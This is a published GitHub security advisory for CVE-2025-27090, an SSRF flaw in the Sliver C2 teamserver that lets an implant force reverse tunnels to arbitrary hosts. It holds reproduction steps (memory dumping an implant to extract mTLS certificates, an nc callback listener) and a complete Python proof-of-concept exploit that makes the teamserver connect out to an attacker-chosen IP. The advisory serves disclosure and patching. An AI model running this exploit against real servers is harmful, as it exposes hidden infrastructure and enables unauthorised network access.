# [M] SSRF in sliver teamserver

## Summary
Severity: Medium
Advisory: GHSA-fh4v-v779-4g2w
CVE: CVE-2025-27090
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:N/SA:N (CVSS_V4)
Published: 2025-02-19
Source: https://github.com/advisories/GHSA-fh4v-v779-4g2w
Type: github-advisory

## Affected
- Go: `github.com/bishopfox/sliver` — affected >=1.5.26 <1.5.43

## Details
### Summary
The reverse port forwarding in sliver teamserver allows the implant to open a reverse tunnel on the sliver teamserver without verifying if the operator instructed the implant to do so


### Reproduction steps
Run server
```
wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
chmod +x sliver-server_linux
./sliver-server_linux
```

Generate binary
```
generate --mtls 127.0.0.1:8443
```

Run it on windows, then `Task manager -> find process -> Create memory dump file`


Install RogueSliver and get the certs
```
git clone https://github.com/ACE-Responder/RogueSliver.git
pip3 install -r requirements.txt --break-system-packages
python3 ExtractCerts.py implant.dmp
```

Start callback listener. Teamserver will connect when POC is run and send "ssrf poc" to nc
```
nc -nvlp 1111
```

Run the poc (pasted at bottom of this file)
```
python3 poc.py <SLIVER IP> <MTLS PORT> <CALLBACK IP> <CALLBACK PORT>
python3 poc.py 192.168.1.33 8443 44.221.186.72 1111
```


### Details
We see here an envelope is read from the connection and if the envelope.Type matches a handler the handler will be executed
```go
func handleSliverConnection(conn net.Conn) {
	mtlsLog.Infof("Accepted incoming connection: %s", conn.RemoteAddr())
	implantConn := core.NewImplantConnection(consts.MtlsStr, conn.RemoteAddr().String())

	defer func() {
		mtlsLog.Debugf("mtls connection closing")
		conn.Close()
		implantConn.Cleanup()
	}()

	done := make(chan bool)
	go func() {
		defer func() {
			done <- true
		}()
		handlers := serverHandlers.GetHandlers()
		for {
			envelope, err := socketReadEnvelope(conn)
			if err != nil {
				mtlsLog.Errorf("Socket read error %v", err)
				return
			}
			implantConn.UpdateLastMessage()
			if envelope.ID != 0 {
				implantConn.RespMutex.RLock()
				if resp, ok := implantConn.Resp[envelope.ID]; ok {
					resp <- envelope // Could deadlock, maybe want to investigate better solutions
				}
				implantConn.RespMutex.RUnlock()
			} else if handler, ok := handlers[envelope.Type]; ok {
				mtlsLog.Debugf("Received new mtls message type %d, data: %s", envelope.Type, envelope.Data)
				go func() {
					respEnvelope := handler(implantConn, envelope.Data)
					if respEnvelope != nil {
						implantConn.Send <- respEnvelope
					}
				}()
			}
		}
	}()

Loop:
	for {
		select {
		case envelope := <-implantConn.Send:
			err := socketWriteEnvelope(conn, envelope)
			if err != nil {
				mtlsLog.Errorf("Socket write failed %v", err)
				break Loop
			}
		case <-done:
			break Loop
		}
	}
	mtlsLog.Debugf("Closing implant connection %s", implantConn.ID)
}
```

The available handlers:
```go
func GetHandlers() map[uint32]ServerHandler {
	return map[uint32]ServerHandler{
		// Sessions
		sliverpb.MsgRegister:    registerSessionHandler,
		sliverpb.MsgTunnelData:  tunnelDataHandler,
		sliverpb.MsgTunnelClose: tunnelCloseHandler,
		sliverpb.MsgPing:        pingHandler,
		sliverpb.MsgSocksData:   socksDataHandler,

		// Beacons
		sliverpb.MsgBeaconRegister: beaconRegisterHandler,
		sliverpb.MsgBeaconTasks:    beaconTasksHandler,

		// Pivots
		sliverpb.MsgPivotPeerEnvelope: pivotPeerEnvelopeHandler,
		sliverpb.MsgPivotPeerFailure:  pivotPeerFailureHandler,
	}
}
```

If we send an envelope with the envelope.Type equaling MsgTunnelData, we will enter the `tunnelDataHandler` function
```go
// The handler mutex prevents a send on a closed channel, without it
// two handlers calls may race when a tunnel is quickly created and closed.
func tunnelDataHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {
	session := core.Sessions.FromImplantConnection(implantConn)
	if session == nil {
		sessionHandlerLog.Warnf("Received tunnel data from unknown session: %v", implantConn)
		return nil
	}
	tunnelHandlerMutex.Lock()
	defer tunnelHandlerMutex.Unlock()
	tunnelData := &sliverpb.TunnelData{}
	proto.Unmarshal(data, tunnelData)

	sessionHandlerLog.Debugf("[DATA] Sequence on tunnel %d, %d, data: %s", tunnelData.TunnelID, tunnelData.Sequence, tunnelData.Data)

	rtunnel := rtunnels.GetRTunnel(tunnelData.TunnelID)
	if rtunnel != nil && session.ID == rtunnel.SessionID {
		RTunnelDataHandler(tunnelData, rtunnel, implantConn)
	} else if rtunnel != nil && session.ID != rtunnel.SessionID {
		sessionHandlerLog.Warnf("Warning: Session %s attempted to send data on reverse tunnel it did not own", session.ID)
	} else if rtunnel == nil && tunnelData.CreateReverse == true {
		createReverseTunnelHandler(implantConn, data)
		//RTunnelDataHandler(tunnelData, rtunnel, implantConn)
	} else {
		tunnel := core.Tunnels.Get(tunnelData.TunnelID)
		if tunnel != nil {
			if session.ID == tunnel.SessionID {
				tunnel.SendDataFromImplant(tunnelData)
			} else {
				sessionHandlerLog.Warnf("Warning: Session %s attempted to send data on tunnel it did not own", session.ID)
			}
		} else {
			sessionHandlerLog.Warnf("Data sent on nil tunnel %d", tunnelData.TunnelID)
		}
	}

	return nil
}
```


The `createReverseTunnelHandler` reads the envelope, creating a socket for `req.Rportfwd.Host` and `req.Rportfwd.Port`.  It will write `recv.Data` to it
```go
func createReverseTunnelHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {
	session := core.Sessions.FromImplantConnection(implantConn)

	req := &sliverpb.TunnelData{}
	proto.Unmarshal(data, req)

	var defaultDialer = new(net.Dialer)

	remoteAddress := fmt.Sprintf("%s:%d", req.Rportfwd.Host, req.Rportfwd.Port)

	ctx, cancelContext := context.WithCancel(context.Background())

	dst, err := defaultDialer.DialContext(ctx, "tcp", remoteAddress)
	//dst, err := net.Dial("tcp", remoteAddress)
	if err != nil {
		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
			Closed:   true,
			TunnelID: req.TunnelID,
		})
		implantConn.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgTunnelClose,
			Data: tunnelClose,
		}
		cancelContext()
		return nil
	}

	if conn, ok := dst.(*net.TCPConn); ok {
		// {{if .Config.Debug}}
		//log.Printf("[portfwd] Configuring keep alive")
		// {{end}}
		conn.SetKeepAlive(true)
		// TODO: Make KeepAlive configurable
		conn.SetKeepAlivePeriod(1000 * time.Second)
	}

	tunnel := rtunnels.NewRTunnel(req.TunnelID, session.ID, dst, dst)
	rtunnels.AddRTunnel(tunnel)
	cleanup := func(reason error) {
		// {{if .Config.Debug}}
		sessionHandlerLog.Infof("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
		// {{end}}
		tunnel := rtunnels.GetRTunnel(tunnel.ID)
		rtunnels.RemoveRTunnel(tunnel.ID)
		dst.Close()
		cancelContext()
	}

	go func() {
		tWriter := tunnelWriter{
			tun:  tunnel,
			conn: implantConn,
		}
		// portfwd only uses one reader, hence the tunnel.Readers[0]
		n, err := io.Copy(tWriter, tunnel.Readers[0])
		_ = n // avoid not used compiler error if debug mode is disabled
		// {{if .Config.Debug}}
		sessionHandlerLog.Infof("[tunnel] Tunnel done, wrote %v bytes", n)
		// {{end}}

		cleanup(err)
	}()

	tunnelDataCache.Add(tunnel.ID, req.Sequence, req)

	// NOTE: The read/write semantics can be a little mind boggling, just remember we're reading
	// from the server and writing to the tunnel's reader (e.g. stdout), so that's why ReadSequence
	// is used here whereas WriteSequence is used for data written back to the server

	// Go through cache and write all sequential data to the reader
	for recv, ok := tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()); ok; recv, ok = tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()) {
		// {{if .Config.Debug}}
		//sessionHandlerLog.Infof("[tunnel] Write %d bytes to tunnel %d (read seq: %d)", len(recv.Data), recv.TunnelID, recv.Sequence)
		// {{end}}
		tunnel.Writer.Write(recv.Data)

		// Delete the entry we just wrote from the cache
		tunnelDataCache.DeleteSeq(tunnel.ID, tunnel.ReadSequence())
		tunnel.IncReadSequence() // Increment sequence counter

		// {{if .Config.Debug}}
		//sessionHandlerLog.Infof("[message just received] %v", tunnelData)
		// {{end}}
	}

	//If cache is building up it probably means a msg was lost and the server is currently hung waiting for it.
	//Send a Resend packet to have the msg resent from the cache
	if tunnelDataCache.Len(tunnel.ID) > 3 {
		data, err := proto.Marshal(&sliverpb.TunnelData{
			Sequence: tunnel.WriteSequence(), // The tunnel write sequence
			Ack:      tunnel.ReadSequence(),
			Resend:   true,
			TunnelID: tunnel.ID,
			Data:     []byte{},
		})
		if err != nil {
			// {{if .Config.Debug}}
			//sessionHandlerLog.Infof("[shell] Failed to marshal protobuf %s", err)
			// {{end}}
		} else {
			// {{if .Config.Debug}}
			//sessionHandlerLog.Infof("[tunnel] Requesting resend of tunnelData seq: %d", tunnel.ReadSequence())
			// {{end}}
			implantConn.RequestResend(data)
		}
	}
	return nil
}
```



### Impact
For current POC, mostly just leaking teamserver origin IP behind redirectors. I am 99% sure you can get full read SSRF but POC is blind only right now

To exploit this for MTLS listeners, you will need MTLS keys
For HTTP listeners, you will need to generate valid nonce
Not sure about other transport types



### POC
POC code, it is not cleaned up at all, please forgive me
```python
#!/usr/bin/python
import sys
import time
import base64
import socket, ssl
from RogueSliver.consts import msgs
import random
import struct
import RogueSliver.sliver_pb2 as sliver
import json
import argparse
import uuid
from google.protobuf import json_format
from rich import print
import random
import string

ssl_ctx = ssl.create_default_context()
ssl_ctx.load_cert_chain(keyfile='certs/client.key',certfile='certs/client.crt')#,ca_certs='sliver/ca.crt')
ssl_ctx.load_verify_locations('certs/ca.crt')
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE



def generate_random_string(length=8):
    # Combine letters and digits
    characters = string.ascii_letters + string.digits
    # Generate random string
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def rand_unicode(junk_sz):
  junk = ''.join([chr(random.randint(0,2047)) for x in range(junk_sz)]).encode('utf-8','surrogatepass').decode()
  return(junk)

def junk_register(junk_sz):
  n = generate_random_string()
  register = {
        "Name": "chebuya"+n,
        "Hostname": "chebuya.local"+n,
        "Uuid": "uuid"+n,
        "Username": "username"+n,
        "Uid": "uid"+n,
        "Gid": "gid"+n,
        "Os": "os"+n,
        "Arch": "arch"+n,
        "Pid": 10,
        "Filename": "filename"+n,
        "ActiveC2": "activec2"+n,
        "Version": "version"+n,
        "ReconnectInterval": 60,
        "ConfigID": "config_id"+n,
        "PeerID": -1,
        "Locale": "locale" + n
  }

  return register



def make_ping_env():
  reg = sliver.Ping()
  json_format.Parse(json.dumps({}),reg)
  envelope = sliver.Envelope()
  envelope.Type = msgs.index('Ping')
  envelope.Data = reg.SerializeToString()

  return envelope



def make_rt_env():
    
    jdata = {
            "Data": "c3NyZiBwb2M=",
            "Closed": False,
            "Sequence": 0,
            "Ack": 0,
            "Resend": False,
            "CreateReverse": True,
            "rportfwd": {
                "Port": int(sys.argv[4]),
                "Host": sys.argv[3],
                "TunnelID": 0,
            },
            "TunnelID": 0,
    }



    reg = sliver.TunnelData()
    json_format.Parse(json.dumps(jdata),reg)
    envelope = sliver.Envelope()
    envelope.Type = msgs.index('TunnelData')
    envelope.Data = reg.SerializeToString()

    return envelope




def send_envelope(envelope,ip,port):
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    with ssl_ctx.wrap_socket(s,) as ssock:
      ssock.connect((ip,port))

      print(len(envelope.SerializeToString()))
      #data_len = struct.pack('!I', len(envelope.SerializeToString()) )
      data_len = struct.pack('I', len(envelope.SerializeToString()) )




      envelope3 = make_rt_env()
      data_len3 = struct.pack('I', len(envelope3.SerializeToString()) )

      print(data_len)

      ssock.write(data_len + envelope.SerializeToString()) 
      ssock.write(data_len3 + envelope3.SerializeToString())



    
      # No idea why this is reqauired
      while True:
          time.sleep(2)
          ssock.write(data_len3 + envelope3.SerializeToString())



def register_session(ip,port):
  print('[yellow]\[i][/yellow] Sending session registration.')
  reg = sliver.Register()
  json_format.Parse(json.dumps(junk_register(50)),reg)
  envelope = sliver.Envelope()
  envelope.Type = msgs.index('Register')
  envelope.Data = reg.SerializeToString()
  send_envelope(envelope,ip,port)

def register_beacon(ip,port):
  print('[yellow]\[i][/yellow] Sending beacon registration.')
  reg = sliver.BeaconRegister()
  reg.ID = str(uuid.uuid4())
  junk_sz = 50
  reg.Interval = random.randint(0,10*junk_sz)
  reg.Jitter = random.randint(0,10*junk_sz)
  reg.NextCheckin = random.randint(0,10*junk_sz)
  json_format.Parse(json.dumps(junk_register(junk_sz)),reg.Register)
  envelope = sliver.Envelope()
  envelope.Type = msgs.index('BeaconRegister')
  envelope.Data = reg.SerializeToString()
  send_envelope(envelope,ip,port)

description = '''
Flood a Sliver C2 server with beacons and sessions. Requires an mtls certificate.
'''

if __name__ == '__main__':
  register_session(sys.argv[1], int(sys.argv[2]))
```

## References
- https://github.com/BishopFox/sliver/security/advisories/GHSA-fh4v-v779-4g2w
- https://nvd.nist.gov/vuln/detail/CVE-2025-27090
- https://github.com/BishopFox/sliver/commit/0f340a25cf3d496ed870dae7da39eab4427bc16f
- https://github.com/BishopFox/sliver/commit/10e245326070c6a5884a02e0790bb7e2baefb3a1
- https://github.com/BishopFox/sliver
